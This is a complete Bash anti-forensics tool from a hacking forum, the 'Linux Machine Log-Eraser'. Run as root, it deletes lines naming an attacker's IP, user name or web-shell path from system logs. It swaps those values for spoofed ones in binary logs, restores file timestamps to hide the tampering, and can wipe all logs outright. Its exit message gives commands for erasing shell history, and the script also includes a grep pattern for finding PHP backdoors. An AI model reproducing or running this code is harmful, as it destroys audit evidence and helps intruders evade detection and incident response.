#! /bin/bash
# June 2011
clear

# A separate file to contain the absolute path for log files. Do edit that per your requirement
source log_files.sh

# Scroll to the end of code to see the progrom flow


# The following arrays would only store the names of the log files found on system
# Not making them read-only as they have to be edited later to add in the existing log file names
found_ascii_log_files=()
found_binary_log_files=()
rtr=""				# A global variable needed to get array back as a return value from "check_time_stamping" function
flag=0				# A global variable to determine whether the back door path has to be deleted or not
spoof_user="root"		# All the entries for the "user_name" spoofing would be replaced by string "root" in non-ASCII log files


# Default banner of the script
default_banner ()
{
	cat << EOF

############################################################################
	      		
			Linux Machine Log-Eraser Script				
		 	    Ver 1.0 - Third Release			
								
		 		Greetz to:				
			(www.garage4hackers.com)	

 	 GGGGGG\                                                   
	GG  __GG\                                                  
	GG /  \__| aaaaaa\   rrrrrr\  aaaaaa\   gggggg\   eeeeee\  
	GG |GGGG\  \____aa\ rr  __rr\ \____aa\ gg  __gg\ ee  __ee\ 
	GG |\_GG | aaaaaaa |rr |  \__|aaaaaaa |gg /  gg |eeeeeeee |
	GG |  GG |aa  __aa |rr |     aa  __aa |gg |  gg |ee   ____|
	\GGGGGG  |\aaaaaaa |rr |     \aaaaaaa |\ggggggg |\eeeeeee\ 
 	 \______/  \_______|\__|      \_______| \____gg | \_______|
                                       	       gg\   gg |          
                                       		gggggg  |          
                                        	\______/
								
	      Usage: $0 [options]			
			-h help				

############################################################################
EOF
call_exit
}

# Help banner of the script. It depicts the usage of various options
help_banner ()
{
cat << EOF

 	 GGGGGG\                                                   
	GG  __GG\                                                  
	GG /  \__| aaaaaa\   rrrrrr\  aaaaaa\   gggggg\   eeeeee\  
	GG |GGGG\  \____aa\ rr  __rr\ \____aa\ gg  __gg\ ee  __ee\ 
	GG |\_GG | aaaaaaa |rr |  \__|aaaaaaa |gg /  gg |eeeeeeee |
	GG |  GG |aa  __aa |rr |     aa  __aa |gg |  gg |ee   ____|
	\GGGGGG  |\aaaaaaa |rr |     \aaaaaaa |\ggggggg |\eeeeeee\ 
 	 \______/  \_______|\__|      \_______| \____gg | \_______|
                                      	       gg\   gg |          
                                       	       \gggggg  |          
                                        	\______/
Usage
=====
$0 options

OPTIONS:
	-h help				Show this message
	-i [ip_address]			Search for a particular ip_address in all log files and search for top 20 IP's logged in log files
	-d [ip_address]			Delete the ip_address from log files
	-s [spoof_ip_address]		Spoof the IP following -d with the one following -s wherever deletion is not possible
	-u [user_name]			The user name whose logs are to be erased/spoofed
	-w [web_shell_path]		The web back door (e.g. c99) shell absolute path you wish to erase from logs
	-f fuck logs files		To erase all log files completely, not recommended though
	-e "file extensions"		To find other backdoors planted on system
	-r [web_root_directory]		The web root directory to start searching backdoors from

	Ex: $0 -h
	    * To show this help message

	Ex: $0 -i 192.168.1.7
	    * To search 192.168.1.7 in all logs files. Basically finding which logs files have trace of it, and
	    * In addition to that, search all log files (/var/log/*) and show Top 20 most logged IP's in log files.
	    * They could be good choices for spoofing

	Ex: $0 -d 192.168.1.7 -s 10.1.1.7 -u "cracker"
	    * To delete lines containing 192.168.1.7 and|or user_name "cracker" from ASCII files, and
	    * To spoof 192.168.1.7 in non-ASCII files by 10.1.1.7 and user_name "cracker" by "root"

	Ex: $0 -d 192.168.1.7 -s 10.1.1.7 -u "cracker" -w "/var/www/xyz.com/uploads/c99.php"
	    * To delete lines containing 192.168.1.7 and|or user_name "cracker" and|or web_shell_path from ASCII files, and
	    * To spoof 192.168.1.7 in non-ASCII files by 10.1.1.7 and user_name "cracker" by "root"
	    
	Ex: $0 -f
	    * To erase all log files listed in log_files.sh completely (not recommended)

	Ex: $0 -e "php txt asp" -r /var/www
	    * To search for probable web backdoors planted on system. Once found, it is recommended to verify the result
	    * The current example searches for files having extensions php or txt or asp in /var/www and subdirectories
	    * Extensions and web_root_directory are customizable

   [!]	Stick to the above OPTION combinations only, else the script might not work properly
	
Author
======
b0nd, b0nd.g4h@gmail.com and www.garage4hackers.com

EOF
call_exit
}

# Checking and storing the log files found on system
existing_log_files ()
{
	for i in ${ascii_log_files[@]}				# Accessing all the array entries declared at the top (log_files.sh)
	do
		if [ -f $i ]; then
			found_ascii_log_files[ $j ]=$i		# fetching the found log files to our empty array
			j=$[$j + 1]
		fi
	done

	for i in ${binary_log_files[@]}				# Accessing all the array entries declared at the top (log_files.sh)
	do
		if [ -f $i ]; then
			found_binary_log_files[ $j ]=$i		# fetching the found log files to our empty array
			j=$[$j + 1]
		fi
	done
}

# Basic Information which might help user customizing script for the first time
search_log_files ()
{

	echo -e "\n>>>>>>>>>>>>> Basic Information <<<<<<<<<<<< \n"
	echo -e "[*] Linux Kernel: `uname -a`"
	
	echo -e "\n[*] The various log files found on system (per our script log_files.sh database):"
	j=0
	
	# following is the call to function to determine the log files found on system
	existing_log_files

	echo -e -n "\n\t[*] ASCII Log Files\n"
	for i in ${found_ascii_log_files[@]}
	do
		echo -e "\t\t$i"
	done
		
	
	echo -e -n "\n\t[*] Binary Log Files\n"
	for i in ${found_binary_log_files[@]}
	do
		echo -e "\t\t$i"
	done

	# The following code is to find all the log files containing the IP fetched to parameter -i
	# e.g. this should be the IP which attacker is willing to find and erase/spoof in log files
	verify_ip $search_ip				# The value for search_ip is obtained from command line arguments (parameter -i)
	
	echo -e "\n[*] Searching for IP $search_ip in all non-zip log files (/var/log/*)"
	# The following won't check the zipped files.
	# It's affecting the atime value, and nothing has been coded to restamp the atime against this grep command
	if [[ "`grep -rlw $search_ip /var/log*`" == "" ]] 
	then
	      echo -e "\n\t[*] Cool! The IP $search_ip does not have trace in any log file"
	else
	      echo -e "\n\t[*] The IP $search_ip has appeared in following log files:"
	      grep -rlw $search_ip /var/log/* | awk ' { print "		" $1 } '
	fi

	# The following would check for gz files in /var/log directory. Hard binded for .gz extension. Make it generic if needed
	have_zgrep=`which zgrep`

	# It's affecting the atime value, and nothing has been coded to restamp the atime against this zgrep command
	if [[ "$have_zgrep" == "" ]]
	then
	    echo -e "\n[*] zgrep could not be found on system"
	    echo -e "\n\t[*] Skipping searching zip files for IP matching. Take care yourself :)" 
	else
	    echo -e "\n[*] zgrep found on system, so checking zip files as well."
	    
	    if [[ "`zgrep -lw $search_ip /var/log/*.gz`" == "" ]] 
	    then
	      echo -e "\n\t[*] Cool! The IP $search_ip does not have trace in any zip log file (/var/log/*)"
	    else
	      echo -e "\n\t[*] The IP $search_ip has appeared in following zip log files in /var/log directory:"
	      echo -e "\n\t[*] The script in current form does not edit zip files. Take care of your (|) yourself"
	      zgrep -lw $search_ip /var/log/*.gz | awk ' { print "		" $1 } '
	    fi
	fi

	echo -e "\n\t[!] It is recommended to include the above found log files, if not already in the list, in the script (log_files.sh)"
	echo -e "\t[!] Edit the file log_files.sh per your requirements"

# Finding the IP's listed in all log files. The most common IP's could be a good choice for spoofing your original IP
# Display Top 20 IP's to make choice from
	echo -e "\n[*] Displaying top 20 IP addresses found in log files"
	echo -e "\n\t[*] It is recommended to choose any suitable one among them to spoof your IP"
	touch tmp-counter.txt                                                                                                                       
	local ip_counter=0                                                                                                                                   
	echo -e -n "\n\tPlease wait "                                                                                                                    
	
	# It's affecting the atime value, and nothing has been coded to restamp the atime against this grep command
	# The following grep command would find all the IP look alikes present in all the log files in /var/log/*.
	# The sort will finally give the uniqe ones
	for i in $(grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' /var/log/* | grep -i ":" | cut -d ":" -f2 | sort -u)                     
	do                                                                    
	# The following grep command is same as above but missing the trailing sort -u, hence all the multiple occurence would be listed.
	# This would help in finding out the occurence of each IP in log files i.e., take one IP from the uniqe list and compare it with
	# all the IP's in unsorted list, whenever there is a match, that would indicate re-occurence and hence the ip_counter would increase by 1
		for j in $(grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' /var/log/* | grep -i ":" | cut -d ":" -f2)                       
		do                                                                                                                                  
			if [[ $i == $j ]]                                                                                                           
			then                                                                                                                        
				ip_counter=$[$ip_counter + 1]                                                                                             
			fi
		done
		echo -e -n "."
		echo "$ip_counter number of times $i has occured in log files" >> tmp-counter.txt
		ip_counter=0
	done
	echo -e "\n\n\t[*] TOP 20 IP (look alikes) found in log files:\n"
	cat tmp-counter.txt | sort -g -r | head -n 20 | awk ' { print "			" $1 "	times	----->	" $5 } '
	rm tmp-counter.txt
	
	call_exit
}

call_exit ()
{
	echo -e "\n[*] Exiting.....\n"
#cat << EOF

	echo -e "\n\t\tWould you mind removing script execution traces from history?"
	echo -e "\t\t============================================================="
	echo -e " ==> http://www.garage4hackers.com/showthread.php?1032-Linux-HISTORY-How-to-avoid-getting-logged\n"

#    1. Do not get logged; use the space technique.
#	# echo \$HISTCONTROL
#	if the output in not "ignorespace" (without quotes); do
#	# export HISTCONTROL=ignorespace
#	Now just give a space in front of any command and it would not be logged in history

#    2. Another way of not getting logged:
#	# history -d \$((HISTCMD-1)) && type_your_command_here_and_execute
#	e.g # history -d \$((HISTCMD-1)) && whoami

#   3. If the script has already been executed without taking precautions, either of the following can be done
#      to remove the traces:
  
#      a) # history -d \$((HISTCMD-2)) && history -d \$((HISTCMD-1))
#	The above command would remove the last entry from history.
#	Executing it couple of times would delete couple of entries

#      b) # history
#	Note down the command number and then execute:
#	# history -d offset
#	It would delete the respective entry from history

#      c) To delete a group of consecutive commands
#	Let us assume there are 50 commands in history and you wish to delete commands from 30 to 50
#	# for i in {51..30}; do history -d "\$i"; done;  

#EOF
	exit
}

fuck_log_files ()
{
	# following is the call to function to determine the log files found on system
	existing_log_files

	echo "FTW! Erasing all log files"
	
	for i in ${found_ascii_log_files[@]}
	do
		echo -e "\t[*] Erasing $i..."
		> $i
	done
			
	for i in ${found_binary_log_files[@]}
	do
		echo -e "\t[*] Erasing $i..."
		> $i
	done
	echo "Done!"
	call_exit
}

verify_ip ()
{
# First check is to verify that the chars entered as IP are integers
# Second check has been made to confirm that only 3 dots are there in IP address
# Third check is to mark the valid IP range. The octect value can not be < 0 or > 255

	str="$1"			# $1 is the first function parameter i.e. IP address here
	cnt=${#str}			# Counting the length of string fetched i.e total chars in IP address, including dots

	dot_counter=0
	
	for ((i=0; i < cnt; i++))
	do
		char=${str:$i:1}	# Reading one character at a time from the input string. Taken from http://www.unix.com/unix-dummies-questions-answers/80215-access-each-character-string.html
	#code=`printf %s "$char" | od -An -vtu1 | sed 's/^[^1-9]*//'`  # copied from http://unix.derkeiler.com/Newsgroups/comp.unix.shell/2004-08/0195.html

		code=`printf '%d' "'$char"`	# Echo the ASCII value of character

	# The first check
		if [ $code -lt 48 ] || [ $code -gt 57 ] 	# Comparing the ASCII value range of Intergers ( 48 - 57 )
		then
			if [ $code -ne 46 ]			# To check the "." value
			then
				echo -e "\n[*] Err!!! Not a valid IP (some non-integer characters), try again.....\n"
				call_exit
			else
				dot_counter=$[$dot_counter + 1]
			fi
		fi
	done

	# The second check
	if [ $dot_counter -ne 3 ]
	then
		echo -e "\n[*] Err!!! Not a valid IP (check the number of dots in IP Address), try again.....\n"
		call_exit
	fi

	# The third check
	# Extract the octets
	octet_a=`echo $1 | cut -d "." -f1`
	octet_b=`echo $1 | cut -d "." -f2`
	octet_c=`echo $1 | cut -d "." -f3`
	octet_d=`echo $1 | cut -d "." -f4`

	if [ \( $octet_a -lt 0 -o $octet_a -gt 255 \) -o \( $octet_b -lt 0 -o $octet_b -gt 255 \) -o \( $octet_c -lt 0 -o $octet_c -gt 255 \) -o \( $octet_d -lt 0 -o $octet_d -gt 255 \) ]
	then
		echo -e "\n[*] Err!!! Not a valid IP (octet value >=0 and <=255), try again.....\n"
		call_exit
	fi
}

# A function to verify whether the user name fetched to script exists or not
# The script will not delete any log line based on user-name "root", else most of the logs would get delete
verify_user_name ()
{
	local user_name="$1"			# $1 is the first function parameter i.e. user-name here
	if [ $user_name != "root" ]
	then
		if [[ `cat /etc/passwd | cut -d ":" -f1 | grep $user_name` != $user_name ]]
		then
			echo -e "\t[*] User name does not exist"
			echo -e "\t[*] Instead of exiting, script will proceed considering you wish to delete logs of some old account which does not exist anymore"
		else
			echo -e "\t[*] user_name ($user_name) verified!"
		fi	
	else
		echo -e "\t[*] User name is 'root'. Script will still take care not to delete lines based on this user name"
		echo -e "\t[*] user_name ($user_name) verified!"
	fi
}


# A function to obtain the original time stamping of the log file before editing the file
check_time_stamping ()
{
	echo -e "======================================================================"
	filename=$1
	echo -e "\n[*] Log File Under RADAR: $filename"
	
	local atime=`stat -c "%x~%y~%z" ${filename} | cut -d "~" -f1 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	local mtime=`stat -c "%x~%y~%z" ${filename} | cut -d "~" -f2 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	
	local array=()
	array=($atime $mtime)
	rtr=(${array[@]})				# rtr is a global variable
}


# The function to edit the log files and restore the Time (time stamping)
edit_ascii_file_and_timestamping ()
{
	for log_file in ${found_ascii_log_files[@]}		# It's a global array and declared at the top of code
	do
	# Calling check_time_stamping function to get the original time stamps before touching the files	
		echo "inside for loop"
		check_time_stamping $log_file
		out=(${rtr[@]})
		atime=${out[0]}
		mtime=${out[1]}
			
		echo -e "\n[*] Time Stamping before editing the log file"
		echo -e "\tatime: $atime"
		echo -e "\tmtime: $mtime"
		
		# Edit only that file which has the desired string/IP in it. Don't touch others unnecessary.
		# The following if and grep stuff does the same. If found IP in file then edit else don't. Err! haven't followed strictly
		# -w is needed else if you intend to delete 192.168.1.1, it would delete all 192.168.1.1* as well
		if grep -qsw "$1" "$log_file"			# $1 is the parameter passed to this function, IP in this case
		then
			echo -e "\n[*] The IP $1 found in $log_file ... so proceeding editing it"
			echo "Sleeping for 5 sec"
			echo -e "\n[*] Editing log file --> $log_file"
			sleep 5
			sed "/$1/d" $log_file > $log_file.new
			mv $log_file.new $log_file
		fi
		
		if [ $2 != 'root' ]				# $2 is the 2nd parameter passed to this function, User name in this case
		then
			if grep -qsw "$2" "$log_file"		# If user name fetched to script found in log file and that is not 'root'
			then
				echo -e "\n\n[*] The username $2 found in $log_file ... so proceeding editing it"
				echo "Sleeping for 5 sec"
				echo -e "\n[*] Editing log file --> $log_file"
				sleep 5
				sed "/$2/d" $log_file > $log_file.new
				mv $log_file.new $log_file
			fi
		fi
		
		if [ $flag -eq 1 ]				# flag=1 states that a web shell path too has to be removed from log files
		then		
			echo -e "\nflag = 1, Deleting Backdoor Shell PATH: $3"
			sed -e "s@$3@@g" $log_file > $log_file.new
			mv $log_file.new $log_file
		fi
		
# The following time stamping is necessary irrespective of whether the IP was found in file or not.
# Because at least the file has been accessed while grep(ing) to search the content
# So the atime has to be restored
# Restoring mtime as well though with more code it can be skipped if value is not found in log file
		
		aatime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f1 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
		amtime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f2 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	#	actime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f3 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	
		echo -e "\n[*] Time Stamping after editing the log file"
		echo -e "\tatime: $aatime"
		echo -e "\tmtime: $amtime"
	#	echo "ctime: $actime"

		echo -e "\n[*] Restoring the time stamp........."
		touch -at $atime $log_file 
		touch -mt $mtime $log_file
		#touch -ct $ctime $log_file

		aaatime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f1 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
		aamtime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f2 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	#	aactime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f3 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	
		echo -e "\n[*] Time Stamping after restoring the time stamp"
		echo -e "\tatime: $aaatime"
		echo -e "\tmtime: $aamtime"
	#	echo "ctime: $aactime"
		echo -e "\n======================================================================\n\n"		
	done
}
	
edit_binary_file_and_timestamping ()
{
	for log_file in ${found_binary_log_files[@]}		# It's a global array and declared at the top of code
	do
	# Calling check_time_stamping function to get the original time stamps before touching the files	
		check_time_stamping $log_file
		out=(${rtr[@]})
		atime=${out[0]}
		mtime=${out[1]}
	#	ctime=${out[2]}
		
		echo -e "\n[*] Time Stamping before editing the log file"
		echo -e "\tatime: $atime"
		echo -e "\tmtime: $mtime"

		echo -e "\nSpoofing IP $1 in binary log file with IP $2"
		echo "Sleeping for 5 sec"
		sleep 5
		sed "s/$1/$2/g" $log_file > $log_file.new
		mv $log_file.new $log_file
				
		if [ $3 != 'root' ]
		then
			echo -e "\nSpoofing user name..."
			echo "Sleeping for 5 sec"
			sleep 5
			sed "s/$3/$spoof_user/g" $log_file > $log_file.new	# Edit the global variable spoof_user at the top
			mv $log_file.new $log_file	
		fi
		
		
# The following time stamping is necessary irrespective of whether the IP was found in file or not.
# Because at least the file has been accessed while grep(ing) to search the content
# So the atime has to be restored
# Restoring mtime as well though with more code it can be skipped if value is not found in log file
		
		aatime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f1 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
		amtime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f2 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	
		echo -e "\n\nTime Stamping after editing the log file"
		echo "atime: $aatime"
		echo "mtime: $amtime"

		echo -e "\nRestoring the time stamp........."
		touch -at $atime $log_file 
		touch -mt $mtime $log_file

		aaatime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f1 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
		aamtime=`stat -c "%x~%y~%z" ${log_file} | cut -d "~" -f2 | cut -d "." -f1 | sed 's/-/ /g' | sed 's/:/ /g' | awk 'BEGIN {FS=" "} {print $1$2$3$4$5"."$6}'`
	
		echo -e "\nTime Stamping after restoring the time stamp"
		echo "atime: $aaatime"
		echo "mtime: $aamtime"
		echo -e "\n======================================================================\n\n"		
	done
	
}

verify_IPs_and_user_name ()
{
	echo "[*] Verifying ip_address $ip_to_be_deleted ..."
	verify_ip $ip_to_be_deleted		# Passing the fetched IP as argument to verify_ip function
	echo -e "\t[*] ip_address ($ip_to_be_deleted) verified!\n"

	echo -e "\n[*] Verifying spoof_ip_address $spoof_ip ..."
	verify_ip $spoof_ip			# Passing the fetched IP as argument to verify_ip function
	echo -e "\t[*] spoof_ip_address ($spoof_ip) verified!\n"
	
	echo -e "\n[*] Verifying user_name: '$user_name' ..."
	verify_user_name $user_name
}

search_web_backdoor_shells ()
{
		for extension in ${extension_type[@]}			# Now the array already holds the various backdoor extensions fetched
		do
			echo -e "\n\t[*] Checking for Extension: $extension"
			sleep 1
			# The following would find and display + outputs the result to a text file
			grep -RPl --include=*.$extension "(passthru|shell_exec|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile) *\(" $web_root_directory | tee -a output.txt | awk ' { print "		" $1 } '
		done
		echo -e "\n\t[!] Done! The out put has been stored in output.txt in append mode. Do not forget to delete it.\n"
		call_exit
}

lets_begin_the_show ()
{
	# Check: If "-e" and "-r", then just find the back door shells and exit
	if [[ -n $web_root_directory ]]
	then
		search_web_backdoor_shells
	# Check: If non "-e"|"-r" then proceed with deleting logs etc.
	elif [[ -n $ip_to_be_deleted ]]
	then
		verify_IPs_and_user_name
		if [[ -z $web_shell_path ]]
		then	# Call the function with 2 values; no web shell path has been fetched. No spoofing, just delete the lines.
			edit_ascii_file_and_timestamping $ip_to_be_deleted $user_name
		else	# Call the function with 3 values; delete web shell path as well. No spoofing, just delete the lines.
			flag=1
			edit_ascii_file_and_timestamping $ip_to_be_deleted $user_name $web_shell_path
		fi
		# Call the function to spoof the original IP and user name. No deletion, just spoofing (they being binary files).
		edit_binary_file_and_timestamping $ip_to_be_deleted $spoof_ip $user_name
	else
		echo -e "\nSome issue which I could not catch"
		call_exit
	fi
}

verify_combination_of_command_line_arguments ()
{
	# Check 1: None of the argument has been passed
	if [[ -z $ip_to_be_deleted ]] && [[ -z $spoof_ip ]] && [[ -z $user_name ]] && [[ -z $extension_type ]] && [[ -z $web_root_directory ]]
	then
		echo -e "\n[*] Error! None of the required argument has been passed"
		default_banner
		call_exit
	fi
	# Check 2: Nothing should be passed in combination with "-e" and "-r"
	if ( [[ -n $extension_type ]] || [[ -n $web_root_directory ]] ) && ( [[ -n $web_shell_path ]] || [[ -n $ip_to_be_deleted ]] || [[ -n $spoof_ip ]] || [[ -n $user_name ]] || [[ -n $web_shell_path ]] )
	then
		echo -e "\n[*] Error! Improper number of arguments passed"
		echo -e "\n[-] Do not mix -e and -r with any other flag!"
		default_banner
		call_exit
	fi
	# Check 3: "-e" and "-r" shall be together
	if ( [[ -n $extension_type ]] && [[ -z $web_root_directory ]] ) || ( [[ -z $extension_type ]] && [[ -n $web_root_directory ]] )
	then
		echo -e "\n[*] Error! Improper number of arguments passed"
		echo -e "\n[*] -e and -r must be specified together and must be non-empty!"
		default_banner
		call_exit
	fi
	# Check 4: If one of the following, the first one, is stated then rest must be
	if [[ -n $ip_to_be_deleted ]] && ( [[ -z $spoof_ip ]] || [[ -z $user_name ]] )
	then
		echo -e "\n[*] Error! Improper number of arguments passed"
		echo -e "\n[-] Include -s and -u when -d specified!"
		default_banner
		call_exit
	fi
	# Check 5: If one of the following, the first one, is stated then rest must be
	if [[ -n $spoof_ip ]] && ( [[ -z $ip_to_be_deleted ]] || [[ -z $user_name ]] )
	then
		echo -e "\n[*] Error! Improper number of arguments passed"
		echo -e "\n[-] Include -d and -u when -s specified!"
		default_banner
		call_exit
	fi
	# Check 6: If one of the following, the first one, is stated then rest must be
	if [[ -n $user_name ]] && ( [[ -z $ip_to_be_deleted ]] || [[ -z $spoof_ip ]] )
	then
		echo -e "\n[*] Error! Improper number of arguments passed"
		echo -e "\n[-] Include -d and -s when -u specified!"
		default_banner
		call_exit
	fi
	# Check 7: If first one is stated, then rest must be
	if [[ -n $web_shell_path ]] && ( [[ -z $ip_to_be_deleted ]] || [[ -z $spoof_ip ]] || [[ -z $user_name ]] )
	then
		echo -e "\n[*] Error! Improper number of arguments passed"
		echo -e "\n[-] Include -d, -s and -u when -w specified!"
		default_banner
		call_exit
	fi
}

# ---------------------------------------- The program execution starts from here -------------------------------


#### Checking UID and EUID value ####
#### Only allow root to execute this script as non-root might not have write access to log files
if [ "$UID" != "0" ]
then
	if [ "$EUID" != "0" ]
	then
		echo -e "\n[*] Cannot run script: Permission denied." "Please be root to use this script".
		call_exit
	fi
fi

#### Show default_banner if no argument has been passed
if [ $# -eq 0 ]
then
	default_banner
fi

 
# Following variables are for the command line arguments
search_ip=
ip_to_be_deleted=
spoof_ip=
user_name=
web_shell_path=
extension=						# This one to handle the multiple extensions give to grep from command prompt
web_root_directory=					
extension_type=()					# This array will hold the multiple extensions
j=0

while getopts  ":hi:fd:s:u:w:e:r:" option
do
	case $option in
		h)
			help_banner
			;;
		i)
			search_ip=$OPTARG
			search_log_files
			;;
		f)
			fuck_log_files
			;;
		d)
			ip_to_be_deleted=$OPTARG	# All the verifications would be done later once combination of command line arguments have been verified
			;;
		s)
			spoof_ip=$OPTARG		# Same as above
			;;
		u)
			user_name=$OPTARG		# Same as above
			;;
		w)
			web_shell_path=$OPTARG
			echo "WEB-SHELL-PATH: $web_shell_path"		# No verification could be done for it
			;;
		e)
			for extension in $OPTARG				
			do
				extension_type[ $j ]=$extension		# Holding multiple extensions passed at command line
				j=$[$j + 1]
			done
			;;	
		r)
			web_root_directory=$OPTARG
			echo -e "\t[*] Web-Root Directory: $web_root_directory"
			;;		
		?)
			echo -e "\n[*] Wrong argument passed"
			default_banner
			;;
	esac
done

# Call to following function to verify the combination of command line arguments passed to script
verify_combination_of_command_line_arguments

# Following function call is necessary in order to find the available log files on system
existing_log_files

# Following function call would be made only after all the mandatory arguments have been passed to the script
lets_begin_the_show
